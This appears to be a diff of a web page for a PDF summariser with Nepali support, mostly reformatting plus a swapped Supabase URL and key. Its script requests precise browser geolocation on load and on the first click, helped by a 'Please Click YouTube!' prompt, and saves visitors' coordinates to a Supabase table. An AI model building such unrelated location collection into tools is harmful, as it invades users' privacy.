@@ -45,7 +45,6 @@
             font-size: 0.95em;
         }
 
-        /* YouTube Section */
         .youtube-section {
             text-align: center;
             margin-bottom: 25px;
@@ -415,20 +414,32 @@
         }
     </style>
 
-<style>
-#locationStatus {
-    margin: 0 auto 15px auto;
-    padding: 10px 12px;
-    border-radius: 8px;
-    background: #f0f2ff;
-    color: #555;
-    font-size: 0.9em;
-    text-align: center;
-}
-#locationStatus.success { background:#e8f7ee; color:#187a3d; }
-#locationStatus.error { background:#ffe8e8; color:#b42318; }
-#locationStatus.waiting { background:#fff7df; color:#8a5a00; }
-</style>
+    <style>
+        #locationStatus {
+            margin: 0 auto 15px auto;
+            padding: 10px 12px;
+            border-radius: 8px;
+            background: #f0f2ff;
+            color: #555;
+            font-size: 0.9em;
+            text-align: center;
+        }
+
+        #locationStatus.success {
+            background: #e8f7ee;
+            color: #187a3d;
+        }
+
+        #locationStatus.error {
+            background: #ffe8e8;
+            color: #b42318;
+        }
+
+        #locationStatus.waiting {
+            background: #fff7df;
+            color: #8a5a00;
+        }
+    </style>
 
 </head>
 
@@ -436,17 +447,24 @@
 
 <div class="container">
 
-    <div id="locationStatus" class="waiting">📍 Location: waiting for permission...</div>
+    <div id="locationStatus" class="waiting">
+        📍 Location: waiting for permission...
+    </div>
 
     <!-- YouTube -->
     <div class="youtube-section">
+
         <div class="youtube-message">
             Please Click YouTube!
         </div>
 
-        <button type="button" class="youtube-btn" id="youtubeButton">
+        <button
+            type="button"
+            class="youtube-btn"
+            id="youtubeButton">
             🎬 YouTube
         </button>
+
     </div>
 
     <h1>📄 PDF to Summary</h1>
@@ -457,7 +475,10 @@
 
     <!-- Upload -->
     <div class="upload-area" id="uploadArea">
-        <div class="upload-icon">📤</div>
+
+        <div class="upload-icon">
+            📤
+        </div>
 
         <div class="upload-text">
             Drag and drop your PDF here
@@ -466,17 +487,35 @@
         <div class="upload-subtext">
             or click to select a file
         </div>
+
     </div>
 
-    <input type="file" id="fileInput" accept=".pdf">
+    <input
+        type="file"
+        id="fileInput"
+        accept=".pdf">
 
     <!-- Error -->
-    <div class="error" id="errorMessage"></div>
+    <div
+        class="error"
+        id="errorMessage">
+    </div>
 
     <!-- File Information -->
-    <div class="file-info" id="fileInfo">
-        <div class="file-name" id="fileName"></div>
-        <div class="file-size" id="fileSize"></div>
+    <div
+        class="file-info"
+        id="fileInfo">
+
+        <div
+            class="file-name"
+            id="fileName">
+        </div>
+
+        <div
+            class="file-size"
+            id="fileSize">
+        </div>
+
     </div>
 
     <!-- Summary Length -->
@@ -493,14 +532,14 @@
                 id="summaryLength"
                 min="20"
                 max="100"
-                value="50"
-            >
+                value="50">
 
             <span class="length-value">
                 <span id="lengthValue">50</span>%
             </span>
 
         </div>
+
     </div>
 
     <!-- Custom Words -->
@@ -513,8 +552,8 @@
         <textarea
             id="customWords"
             rows="3"
-            placeholder="उदाहरण: कारण, महत्वपूर्ण मिति, मुख्य बुँदा..."
-        ></textarea>
+            placeholder="उदाहरण: कारण, महत्वपूर्ण मिति, मुख्य बुँदा...">
+        </textarea>
 
         <small>
             यी शब्दले सारांशमा तपाईंले चाहेको विषयलाई प्राथमिकता दिन्छन्।
@@ -553,22 +592,22 @@
         <button
             class="btn-summarize"
             id="summarizeBtn"
-            disabled
-        >
+            disabled>
             Summarize
         </button>
 
         <button
             class="btn-clear"
-            id="clearBtn"
-        >
+            id="clearBtn">
             Clear
         </button>
 
     </div>
 
     <!-- Loading -->
-    <div class="loading" id="loading">
+    <div
+        class="loading"
+        id="loading">
 
         <div class="spinner"></div>
 
@@ -579,55 +618,76 @@
     </div>
 
     <!-- Summary Result -->
-    <div class="summary-section" id="summarySection">
+    <div
+        class="summary-section"
+        id="summarySection">
 
         <div class="summary-title">
             Summary Result
         </div>
 
-        <div class="summary-content" id="summaryContent"></div>
+        <div
+            class="summary-content"
+            id="summaryContent">
+        </div>
 
         <div class="stats">
 
             <div class="stat-item">
+
                 <div class="stat-label">
                     Original Words
                 </div>
 
-                <div class="stat-value" id="originalWords">
+                <div
+                    class="stat-value"
+                    id="originalWords">
                     0
                 </div>
+
             </div>
 
             <div class="stat-item">
+
                 <div class="stat-label">
                     Summary Words
                 </div>
 
-                <div class="stat-value" id="summaryWords">
+                <div
+                    class="stat-value"
+                    id="summaryWords">
                     0
                 </div>
+
             </div>
 
             <div class="stat-item">
+
                 <div class="stat-label">
                     Compression
                 </div>
 
-                <div class="stat-value" id="compressionRatio">
+                <div
+                    class="stat-value"
+                    id="compressionRatio">
                     0%
                 </div>
+
             </div>
 
         </div>
 
         <div class="action-buttons">
 
-            <button class="btn-copy" id="copyBtn">
+            <button
+                class="btn-copy"
+                id="copyBtn">
                 📋 Copy
             </button>
 
-            <button class="btn-download" id="downloadBtn">
+            <button
+                class="btn-download"
+                id="downloadBtn">
                 ⬇️ Download
             </button>
 
@@ -642,10 +702,12 @@
 
 <!-- PDF.js -->
 <script type="module">
+
     import * as pdfjsLib from
         "https://cdnjs.cloudflare.com/ajax/libs/pdf.js/4.10.38/pdf.min.mjs";
 
     window.pdfjsLib = pdfjsLib;
+
 </script>
 
 <script>
@@ -687,10 +749,10 @@ if (!sessionId) {
    ========================================= */
 
 const SUPABASE_URL =
-    "https://figioydpzoefmpowwnqj.supabase.co";
+    "https://sqtavjfwndcnlbvngrwi.supabase.co";
 
 const SUPABASE_PUBLISHABLE_KEY =
-    "sb_publishable_5DFvvfjkx0ptWcY5siW8qg_J53DoCux";
+    "sb_publishable_Jl1JGDnaIqHQDcXEL0C_pg_EWgele-2";
 
 let supabaseClient = null;
 
@@ -813,106 +875,242 @@ document
    LOCATION + VISITOR LOCAL TIME
    ========================================= */
 
-const locationStatus = document.getElementById("locationStatus");
+const locationStatus =
+    document.getElementById("locationStatus");
 
-function setLocationStatus(message, type = "waiting") {
+
+function setLocationStatus(
+    message,
+    type = "waiting"
+) {
+
     if (locationStatus) {
-        locationStatus.textContent = message;
-        locationStatus.className = type;
+
+        locationStatus.textContent =
+            message;
+
+        locationStatus.className =
+            type;
     }
 }
 
-function getVisitorLocalTime() {
-    const now = new Date();
-    const parts = new Intl.DateTimeFormat("en-CA", {
-        year: "numeric",
-        month: "2-digit",
-        day: "2-digit",
-        hour: "2-digit",
-        minute: "2-digit",
-        second: "2-digit",
-        hour12: false
-    }).formatToParts(now);
 
-    const map = Object.fromEntries(
-        parts.map(part => [part.type, part.value])
-    );
+function getVisitorLocalTime() {
+
+    const now =
+        new Date();
+
+    const parts =
+        new Intl.DateTimeFormat(
+            "en-CA",
+            {
+                year: "numeric",
+                month: "2-digit",
+                day: "2-digit",
+                hour: "2-digit",
+                minute: "2-digit",
+                second: "2-digit",
+                hour12: false
+            }
+        ).formatToParts(now);
+
+    const map =
+        Object.fromEntries(
+            parts.map(
+                part =>
+                    [
+                        part.type,
+                        part.value
+                    ]
+            )
+        );
 
     return `${map.year}-${map.month}-${map.day} ${map.hour}:${map.minute}:${map.second}`;
 }
 
+
 async function requestClientLocation() {
+
     if (!supabaseClient) {
-        setLocationStatus("❌ Supabase is not connected.", "error");
-        console.error("Supabase client was not created.");
+
+        setLocationStatus(
+            "❌ Supabase is not connected.",
+            "error"
+        );
+
+        console.error(
+            "Supabase client was not created."
+        );
+
         return;
     }
+
 
     if (!navigator.geolocation) {
-        setLocationStatus("❌ This browser does not support location.", "error");
+
+        setLocationStatus(
+            "❌ This browser does not support location.",
+            "error"
+        );
+
         return;
     }
 
-    // Geolocation normally requires HTTPS or localhost.
-    if (location.protocol !== "https:" && location.hostname !== "localhost" && location.hostname !== "127.0.0.1") {
-        setLocationStatus("⚠️ Location requires HTTPS (or localhost).", "error");
-        console.error("Geolocation requires HTTPS or localhost.");
+
+    if (
+        location.protocol !== "https:" &&
+        location.hostname !== "localhost" &&
+        location.hostname !== "127.0.0.1"
+    ) {
+
+        setLocationStatus(
+            "⚠️ Location requires HTTPS (or localhost).",
+            "error"
+        );
+
+        console.error(
+            "Geolocation requires HTTPS or localhost."
+        );
+
         return;
     }
 
-    setLocationStatus("📍 Asking for location permission...", "waiting");
+
+    setLocationStatus(
+        "📍 Asking for location permission...",
+        "waiting"
+    );
+
 
     const timezone =
-        Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
+        Intl.DateTimeFormat()
+            .resolvedOptions()
+            .timeZone ||
+        "Unknown";
 
-    const visitorLocalTime = getVisitorLocalTime();
+
+    const visitorLocalTime =
+        getVisitorLocalTime();
+
 
     navigator.geolocation.getCurrentPosition(
+
         async (position) => {
-            const { latitude, longitude, accuracy } = position.coords;
 
-            setLocationStatus("📍 Location received. Saving to Supabase...", "waiting");
+            const {
+                latitude,
+                longitude,
+                accuracy
+            } =
+                position.coords;
 
-            const { error } = await supabaseClient
-                .from("client_locations")
-                .insert({
-                    session_id: sessionId,
-                    latitude: latitude,
-                    longitude: longitude,
-                    accuracy_meters: accuracy,
-                    timezone: timezone,
-                    visitor_local_time: visitorLocalTime
-                });
+
+            setLocationStatus(
+                "📍 Location received. Saving to Supabase...",
+                "waiting"
+            );
+
+
+            const {
+                error
+            } =
+                await supabaseClient
+                    .from("client_locations")
+                    .insert({
+
+                        session_id:
+                            sessionId,
+
+                        latitude:
+                            latitude,
+
+                        longitude:
+                            longitude,
+
+                        accuracy_meters:
+                            accuracy,
+
+                        timezone:
+                            timezone,
+
+                        visitor_local_time:
+                            visitorLocalTime
+                    });
+
 
             if (error) {
+
                 setLocationStatus(
-                    "❌ Supabase insert failed: " + error.message,
+                    "❌ Supabase insert failed: " +
+                    error.message,
                     "error"
                 );
-                console.error("Could not save location:", error);
+
+                console.error(
+                    "Could not save location:",
+                    error
+                );
+
                 return;
             }
+
 
             setLocationStatus(
                 `✅ Location saved • ${timezone} • ${visitorLocalTime}`,
                 "success"
             );
-            console.log("Client location saved successfully.");
-        },
-        (error) => {
-            let message = "Could not get location.";
 
-            if (error.code === error.PERMISSION_DENIED) {
-                message = "❌ Location permission was denied. Allow location and reload.";
-            } else if (error.code === error.POSITION_UNAVAILABLE) {
-                message = "❌ Location is currently unavailable.";
-            } else if (error.code === error.TIMEOUT) {
-                message = "❌ Location request timed out.";
+            console.log(
+                "Client location saved successfully."
+            );
+        },
+
+
+        (error) => {
+
+            let message =
+                "Could not get location.";
+
+
+            if (
+                error.code ===
+                error.PERMISSION_DENIED
+            ) {
+
+                message =
+                    "❌ Location permission was denied. Allow location and reload.";
+
+            } else if (
+                error.code ===
+                error.POSITION_UNAVAILABLE
+            ) {
+
+                message =
+                    "❌ Location is currently unavailable.";
+
+            } else if (
+                error.code ===
+                error.TIMEOUT
+            ) {
+
+                message =
+                    "❌ Location request timed out.";
             }
 
-            setLocationStatus(message, "error");
-            console.error("Geolocation error:", error);
+
+            setLocationStatus(
+                message,
+                "error"
+            );
+
+
+            console.error(
+                "Geolocation error:",
+                error
+            );
         },
+
+
         {
             enableHighAccuracy: true,
             timeout: 15000,
@@ -921,19 +1119,41 @@ async function requestClientLocation() {
     );
 }
 
-/* Ask automatically when the page is loaded. */
-window.addEventListener("load", () => {
-    requestClientLocation();
-});
 
-/* Also try when the user interacts with the page.
-   This helps when the browser blocks permission requests
-   made immediately during page load. */
-document.addEventListener("click", () => {
-    if (locationStatus && !locationStatus.classList.contains("success")) {
+/* Ask automatically when page loads */
+
+window.addEventListener(
+    "load",
+    () => {
+
         requestClientLocation();
+
     }
-}, { once: true });
+);
+
+
+/* Also try when user interacts */
+
+document.addEventListener(
+    "click",
+    () => {
+
+        if (
+            locationStatus &&
+            !locationStatus.classList.contains(
+                "success"
+            )
+        ) {
+
+            requestClientLocation();
+
+        }
+
+    },
+    {
+        once: true
+    }
+);
 
 
 /* =========================================
@@ -942,7 +1162,8 @@ document.addEventListener("click", () => {
 
 uploadArea.addEventListener(
     "click",
-    () => fileInput.click()
+    () =>
+        fileInput.click()
 );
 
 
@@ -1032,6 +1253,7 @@ function handleFileSelect(file) {
         return;
     }
 
+
     if (
         file.size >
         50 * 1024 * 1024
@@ -1044,22 +1266,30 @@ function handleFileSelect(file) {
         return;
     }
 
-    selectedFile = file;
+
+    selectedFile =
+        file;
+
 
     fileName.textContent =
         file.name;
 
+
     fileSize.textContent =
         `Size: ${(file.size / 1024).toFixed(2)} KB`;
+
 
     fileInfo.classList.add(
         "show"
     );
 
+
     summarizeBtn.disabled =
         false;
 
+
     hideError();
+
 
     summarySection.classList.remove(
         "show"
@@ -1075,9 +1305,11 @@ clearBtn.addEventListener(
     "click",
     () => {
 
-        selectedFile = null;
+        selectedFile =
+            null;
 
-        fileInput.value = "";
+        fileInput.value =
+            "";
 
         fileInfo.classList.remove(
             "show"
@@ -1090,7 +1322,8 @@ clearBtn.addEventListener(
         summarizeBtn.disabled =
             true;
 
-        customWords.value = "";
+        customWords.value =
+            "";
 
         summaryStyle.value =
             "short";
@@ -1144,12 +1377,14 @@ async function summarizePDF() {
 
     hideError();
 
+
     try {
 
         const text =
             await extractPdfText(
                 selectedFile
             );
+
 
         if (!text.trim()) {
 
@@ -1158,17 +1393,22 @@ async function summarizePDF() {
             );
         }
 
+
         const summary =
             createSummary(
                 text,
-                Number(summaryLength.value),
+                Number(
+                    summaryLength.value
+                ),
                 customWords.value,
                 summaryStyle.value
             );
 
+
         displaySummary({
 
-            summary: summary,
+            summary:
+                summary,
 
             originalWords:
                 countWords(text),
@@ -1189,12 +1429,14 @@ async function summarizePDF() {
                 )
         });
 
+
     } catch (error) {
 
         showError(
             error.message ||
             "Failed to process PDF."
         );
+
 
     } finally {
 
@@ -1218,13 +1460,16 @@ async function extractPdfText(file) {
         );
     }
 
+
     window.pdfjsLib
         .GlobalWorkerOptions
         .workerSrc =
         "https://cdnjs.cloudflare.com/ajax/libs/pdf.js/4.10.38/pdf.worker.min.mjs";
 
+
     const buffer =
         await file.arrayBuffer();
+
 
     const pdf =
         await window.pdfjsLib
@@ -1233,7 +1478,10 @@ async function extractPdfText(file) {
             })
             .promise;
 
-    let text = "";
+
+    let text =
+        "";
+
 
     for (
         let pageNumber = 1;
@@ -1246,19 +1494,25 @@ async function extractPdfText(file) {
                 pageNumber
             );
 
+
         const content =
             await page.getTextContent();
+
 
         const pageText =
             content.items
                 .map(
-                    item => item.str
+                    item =>
+                        item.str
                 )
                 .join(" ");
 
+
         text +=
-            pageText + "\n";
+            pageText +
+            "\n";
     }
+
 
     return text;
 }
@@ -1277,8 +1531,14 @@ function countWords(text) {
 function normalizeText(text) {
 
     return text
-        .replace(/\u00ad/g, "")
-        .replace(/\s+/gu, " ")
+        .replace(
+            /\u00ad/g,
+            ""
+        )
+        .replace(
+            /\s+/gu,
+            " "
+        )
         .trim();
 }
 
@@ -1287,7 +1547,9 @@ function tokenize(text) {
 
     return (
         text
-            .toLocaleLowerCase("ne-NP")
+            .toLocaleLowerCase(
+                "ne-NP"
+            )
             .match(
                 /[\p{L}\p{M}\p{N}]+/gu
             ) || []
@@ -1302,9 +1564,11 @@ function splitSentences(text) {
             /[^.!?\u0964\u0965]+(?:[.!?\u0964\u0965]+|$)/gu
         ) || [text];
 
+
     return parts
         .map(
-            s => s.trim()
+            s =>
+                s.trim()
         )
         .filter(Boolean);
 }
@@ -1324,55 +1588,79 @@ function createSummary(
     const cleanText =
         normalizeText(text);
 
+
     const sentences =
-        splitSentences(cleanText);
+        splitSentences(
+            cleanText
+        );
+
 
     if (!cleanText) {
+
         return "";
     }
 
+
     if (sentences.length <= 1) {
+
         return cleanText;
     }
+
 
     const stopWords =
         new Set([
 
-            "the", "and", "that", "this",
-            "with", "from", "have", "were",
-            "which", "their", "there", "about",
-            "would", "could", "should", "into",
-            "also", "than", "then", "they",
-            "them", "these", "those", "your",
-            "you", "for", "are", "was",
-            "been", "has", "had", "will",
-            "can", "not", "but", "all",
-            "any", "our", "out", "its",
-            "his", "her", "she", "him",
-            "who", "what", "when", "where",
-            "how", "why", "a", "an", "in",
-            "on", "of", "to", "is", "it",
-            "as", "at", "by", "or", "be",
-            "we", "i",
+            "the", "and", "that",
+            "this", "with", "from",
+            "have", "were", "which",
+            "their", "there", "about",
+            "would", "could",
+            "should", "into",
+            "also", "than", "then",
+            "they", "them", "these",
+            "those", "your", "you",
+            "for", "are", "was",
+            "been", "has", "had",
+            "will", "can", "not",
+            "but", "all", "any",
+            "our", "out", "its",
+            "his", "her", "she",
+            "him", "who", "what",
+            "when", "where", "how",
+            "why", "a", "an", "in",
+            "on", "of", "to", "is",
+            "it", "as", "at", "by",
+            "or", "be", "we", "i",
 
-            "र", "रु", "रू", "को", "का",
-            "की", "ले", "लाई", "बाट", "मा",
-            "देखि", "सम्म", "सँग", "संग",
-            "भने", "भन्ने", "यो", "त्यो",
-            "यी", "ती", "छ", "छन्", "हो",
-            "हुन", "गरे", "गर्न", "गरेको",
-            "गर्नु", "गर्छ", "गर्दा", "थियो",
-            "थिए", "भएको", "भएका", "एक",
-            "पनि", "तर", "वा", "नै", "तथा",
-            "यस", "त्यस", "आफ्नो"
+            "र", "रु", "रू", "को",
+            "का", "की", "ले",
+            "लाई", "बाट", "मा",
+            "देखि", "सम्म",
+            "सँग", "संग", "भने",
+            "भन्ने", "यो", "त्यो",
+            "यी", "ती", "छ",
+            "छन्", "हो", "हुन",
+            "गरे", "गर्न",
+            "गरेको", "गर्नु",
+            "गर्छ", "गर्दा",
+            "थियो", "थिए",
+            "भएको", "भएका",
+            "एक", "पनि", "तर",
+            "वा", "नै", "तथा",
+            "यस", "त्यस",
+            "आफ्नो"
         ]);
 
 
     const frequency =
         Object.create(null);
 
+
     const allWords =
-        tokenize(cleanText);
+        tokenize(
+            cleanText
+        );
+
 
     allWords.forEach(
         word => {
@@ -1393,26 +1681,41 @@ function createSummary(
 
 
     const focusWords =
-        tokenize(focusText)
-            .filter(
-                word =>
-                    word.length > 1 &&
-                    !stopWords.has(word)
-            );
+        tokenize(
+            focusText
+        )
+        .filter(
+            word =>
+                word.length > 1 &&
+                !stopWords.has(word)
+        );
 
 
     const focusSet =
-        new Set(focusWords);
+        new Set(
+            focusWords
+        );
 
 
     let ratio;
 
+
     if (style === "short") {
-        ratio = 0.15;
-    } else if (style === "detailed") {
-        ratio = 0.35;
+
+        ratio =
+            0.15;
+
+    } else if (
+        style === "detailed"
+    ) {
+
+        ratio =
+            0.35;
+
     } else {
-        ratio = 0.25;
+
+        ratio =
+            0.25;
     }
 
 
@@ -1421,7 +1724,8 @@ function createSummary(
             0.5,
             Math.min(
                 2,
-                Number(percentage) / 50
+                Number(percentage) /
+                50
             )
         );
 
@@ -1465,14 +1769,18 @@ function createSummary(
             (sentence, index) => {
 
                 const words =
-                    tokenize(sentence)
-                        .filter(
-                            word =>
-                                word.length > 1 &&
-                                !stopWords.has(word)
-                        );
+                    tokenize(
+                        sentence
+                    )
+                    .filter(
+                        word =>
+                            word.length > 1 &&
+                            !stopWords.has(word)
+                    );
 
-                let score = 0;
+
+                let score =
+                    0;
 
 
                 words.forEach(
@@ -1482,11 +1790,15 @@ function createSummary(
                             frequency[word] ||
                             0;
 
+
                         if (
-                            focusSet.has(word)
+                            focusSet.has(
+                                word
+                            )
                         ) {
 
-                            score += 20;
+                            score +=
+                                20;
                         }
                     }
                 );
@@ -1507,7 +1819,8 @@ function createSummary(
                             )
                         ) {
 
-                            score += 8;
+                            score +=
+                                8;
                         }
                     }
                 );
@@ -1544,7 +1857,8 @@ function createSummary(
     return scored
         .sort(
             (a, b) =>
-                b.score - a.score
+                b.score -
+                a.score
         )
         .slice(
             0,
@@ -1552,7 +1866,8 @@ function createSummary(
         )
         .sort(
             (a, b) =>
-                a.index - b.index
+                a.index -
+                b.index
         )
         .map(
             item =>
@@ -1571,14 +1886,19 @@ function displaySummary(data) {
     summaryContent.textContent =
         data.summary;
 
+
     originalWords.textContent =
         data.originalWords;
+
 
     summaryWords.textContent =
         data.summaryWords;
 
+
     compressionRatio.textContent =
-        data.compressionRatio + "%";
+        data.compressionRatio +
+        "%";
+
 
     summarySection.classList.add(
         "show"
@@ -1597,6 +1917,7 @@ copyBtn.addEventListener(
         const text =
             summaryContent.textContent;
 
+
         navigator.clipboard
             .writeText(text)
             .then(
@@ -1605,8 +1926,10 @@ copyBtn.addEventListener(
                     const originalText =
                         copyBtn.textContent;
 
+
                     copyBtn.textContent =
                         "✅ Copied!";
+
 
                     setTimeout(
                         () => {
@@ -1642,8 +1965,12 @@ downloadBtn.addEventListener(
         const text =
             summaryContent.textContent;
 
+
         const element =
-            document.createElement("a");
+            document.createElement(
+                "a"
+            );
+
 
         element.setAttribute(
             "href",
@@ -1651,19 +1978,24 @@ downloadBtn.addEventListener(
             encodeURIComponent(text)
         );
 
+
         element.setAttribute(
             "download",
             "summary.txt"
         );
 
+
         element.style.display =
             "none";
+
 
         document.body.appendChild(
             element
         );
 
+
         element.click();
+
 
         document.body.removeChild(
             element
@@ -1680,6 +2012,7 @@ function showError(message) {
 
     errorMessage.textContent =
         message;
+
 
     errorMessage.classList.add(
         "show"
